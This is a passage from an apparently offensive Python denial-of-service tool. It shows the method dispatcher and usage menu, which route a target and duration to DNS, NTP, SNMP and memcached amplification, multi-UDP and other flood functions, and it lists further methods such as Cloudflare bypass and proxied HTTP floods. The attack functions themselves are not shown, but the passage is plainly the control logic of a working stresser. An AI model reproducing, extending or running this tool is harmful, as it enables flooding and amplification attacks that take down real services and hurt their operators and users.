                ip, port = target.split(':')
            else:
                ip, port = target, "53"
            run_dns_amp(ip, port, thread, t)
        elif method == "ntpamp":
            run_ntp_amp(target, thread, t)
        elif method == "snmpamp":
            run_snmp_amp(target, thread, t)
        elif method == "memcamp":
            run_memc_amp(target, thread, t)
        elif method == "multiudp":
            if ':' in target:
                ip, port = target.split(':')
            else:
                ip, port = target, "80"
            run_multi_udp(ip, port, thread, t)
        elif method == "yukib":
            if ':' in target:
                ip, port = target.split(':')
            else:
                ip, port = target, "80"
            run_yuki_b(ip, port, int(thread), int(t))
        else:
            stdout.write("No method found.\n")
            stdout.write("Methods: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
            stdout.write("         udp, tcp, dnsamp, ntpamp, snmpamp, memcamp, multiudp, yukib\n")
            sys.exit(1)
        
        timer.join()
    else:
        stdout.write("Methods: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write("         udp, tcp, dnsamp, ntpamp, snmpamp, memcamp, multiudp, yukib\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        stdout.write(f"   or:~# python3 {sys.argv[0]}  (interactive mode)\n")
        sys.exit()
